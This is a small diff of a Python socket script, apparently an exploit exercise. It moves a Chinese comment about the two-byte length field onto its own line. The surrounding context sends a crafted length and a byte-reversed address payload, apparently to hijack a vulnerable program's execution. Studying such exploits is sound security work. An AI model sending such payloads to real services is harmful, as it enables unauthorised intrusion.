@@ -26,7 +26,9 @@ if __name__ == "__main__":
             print("Sent: {}".format(user_input))
 
             if int(user_input) == 2:
-                exploit_len = b"04"  # 注意由于客户端要求接收 2 个字节, 所以这里也要发送 2 个字节才行
+                # 注意由于客户端要求接收 2 个字节, 所以这里也要发送 2 个字节才行
+                exploit_len = b"04"
+
                 exploit_data = b"\x00\x40\x42\xF0"[::-1]
                 sock.sendall(exploit_len)
                 sock.sendall(exploit_data)
